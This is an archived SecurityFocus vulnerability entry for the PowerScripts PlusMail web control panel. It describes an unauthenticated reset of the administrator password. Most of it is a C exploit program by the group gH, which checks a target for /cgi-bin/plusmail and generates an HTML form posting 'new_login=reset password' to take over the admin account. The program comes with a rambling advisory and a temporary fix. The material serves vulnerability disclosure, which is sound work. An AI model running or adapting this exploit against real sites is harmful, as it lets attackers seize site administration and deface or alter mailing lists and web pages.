source: http://www.securityfocus.com/bid/2653/info
  
PowerScripts PlusMail Web Control Panel is a web-based administration suite for maintaining mailing lists, mail aliases, and web sites. It is reportedly possible to change the administrative username and password without knowing the current one, by passing the proper arguments to the plusmail script. After this has been accomplished, the web console allows a range of potentially destructive activities including changing of e-mail aliases, mailing lists, web site editing, and various other privileged tasks. This can be accomplished by submitting the argument "new_login" with the value "reset password" to the plusmail script (typically /cgi-bin/plusmail). Other arguments the script expects are "username", "password" and "password1", where username equals the new login name, password and password1 contain matching passwords to set the new password to.
  
The specific affected versions have not been determined, and the developer cannot be located. 

/*

[gH Security Advisory]

software affected:	PowerScripts PlusMail
versions affected:	All versions to current.
discussion:		Read report below.

*/

/*

[gH-plus.c]

title:		[gH plusmail vulnerability]
date:		01.20.2000
author:		ytcracker of gH [phed@felons.org]
comments:	plusmail is an extremely popular cgi-based administration
		tool that allows you to take control of your website
		with a graphical control panel interface.  the password
		file, however, is set with permissions rw enabled,
		therefore granting the authority to change the password
		whenever's clever.
		the following code will detect the vulnerability and
		generate the required html to exploit.
shouts:		seven one nine.  all of gH.  www.mp3.com/category5.
		herf@ghettophreaks.org for finding vulnerability.

[Advisory Information]

written by:	mosthated of gH [most@pure-security.net]
vulnerable:	So far, any environment running Plusmail.
report:		Noticed plusmail running on multiple operating systems.
		The vulnerability lies in the web based tool, which
		now that is easily exploited, gives you "ADVANCED CONTROL"
		of a target website.  Below is the code by ytcracker of gH,
		which demonstrates how easy it is to generate the html code
		which is executed by your web browser to compromise the
		target host.  We have noticed this PlusMail program is widely
		used, but have yet to succeed in finding the main site for
		PlusMail to acknowledge the developers of the remote 
		vulnerability.

		Most likely this will be ripped out during the online trading,
		because of script kids not likely this factual addition, but 
		never the less, it will be expressed.  This exploit was written 
		to acknowledge security weaknesses, but in no way promotes web 
		page defacments.  If you further use this program to gain access 
		to anything not normally accessable by yourself, meaning you 
		script kids, then you are subject to be prosecuted and even get 
		10 years in prison.  Is it honestly worth it to compile this program 
		and randomly ./hack sites and deface them with this half way 
		automatted program to put your nick & group on it?  
		The answer is NO.  gh/global hell.. Heard of us?? Seen us on TV??
		Read about us?? Most likely..	We've changed and gained knowledge 
		from the experience....Been there done that..  The world didn't
		believe that a group like this could completely go legit, the IT
		professionals figured we would retaliate against the fbi and the
		world was scared by misleading media articles about how we are
		terrorist and destructive teens.  I ask the world now, who is helping
		who?  Did the media find this vulnerability?  Did the stereotypist
		who label us as "cyber gang members" find this vulnerability and allow
		networks around the world to be patched before so called "destructive
		hackers" gained access to them.  Answer yet again, NO, we did, not you
		who falsely claim to be helping with security.  Your defacements don't
		help anything, we thought it did before as well, now we realized that
		it does nothing positive.  You stereotypists know nothing about gH, yet
		can write articles, you're wrong.  You people think so much that you know
		so much about hackers.  You know nothing, what you think you know, is
		wrong.  What you don't know about us, the information is right under
		your nose, yet you still can't put your finger on it.  Their are 2 sides
		to the so called "hacking scene", you people should realize there will
		always be a good and a bad side to most matters.  Don't exploit the
		fact that you don't know anything about the whole situation, just face 
		the real fact, our knowledge could be a great help to all, why not
		accept us as normal people, not untrue off the wall assumptions.
		If you use programs like this to deface sites, think before you use
		this one, because we have been through the childish fights online
		and expressed our feelings, we are still where we started, from square
		one and would not have gone any farther, until we realized that what we
		were doing was stupid, pathetic, futureless and illegal.  Choose
		your path wisely, either stop the script kiddie bullshit or get 
		your door kicked in, you decide.
fix:		Move/rename the PlusMail directory as a temporary fix.

*/

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <ctype.h>
#include <fcntl.h>
#include <strings.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <arpa/nameser.h>
#include <sys/stat.h>
#include <sys/socket.h>

int main(int argc, char *argv[])
{
	int sock;
        unsigned long vulnip;

	struct in_addr addr;
	struct sockaddr_in sin;
	struct hostent *he;
                                                                     	
        char *detect;
	char buffer[1024];
	char plusvuln[]="GET /cgi-bin/plusmail HTTP/1.0\n\n";
	char htmI[]="<html><head><title>[gH plusmail exploit]</title></head><form action=\"http://";
	char htmII[]="/cgi-bin/plusmail\" method=\"post\"><p>username: <input type=\"text\" name=\"username\"><br>password:
<input type=\"password\" name=\"password\"><br>retype password: <input type=\"password\" name=\"password1\"></p><p><input
type=\"submit\" name=\"new_login\" value=\"reset password\"></p></form><p><a href=\"http://pure-security.net\">Pure Security
Networks</a></p></body></html>";

        FILE *html;

	printf("\n [gH plusmail exploit] [ytcracker] [phed@felons.org]\n");

	if(argc<2)
	{
		printf(" usage: %s [vulnerable website]\n\n",argv[0]);
                exit(0);
	}

	if ((he=gethostbyname(argv[1])) == NULL)
	{
		herror("gethostbyname");
		exit(0);
	}

	vulnip=inet_addr(argv[1]);
        vulnip=ntohl(vulnip);

	sock=socket(AF_INET, SOCK_STREAM, 0);
	bcopy(he->h_addr, (char *)&sin.sin_addr, he->h_length);
	sin.sin_family=AF_INET;
	sin.sin_port=htons(80);

	if (connect(sock, (struct sockaddr*)&sin, sizeof(sin))!=0)
	{  
		perror("connect");
	}

	send(sock, plusvuln,strlen(plusvuln),0);
	recv(sock, buffer, sizeof(buffer),0);
	detect = strstr(buffer,"404");
	close(sock);
     
	if( detect != NULL)
        {
		printf(" vulnerabilty not detected.\n");
                exit(0);
        }
	else
		printf(" vulnerability detected.  generating html...\n");
	
	html=fopen("plus.html","w+b");
	fprintf(html,"%s",htmI);
	fprintf(html,"%s",argv[1]);
	fprintf(html,"%s",htmII);
        fclose(html);

	printf(" spawning lynx...\n");

        system("lynx plus.html");
	return 0;
}


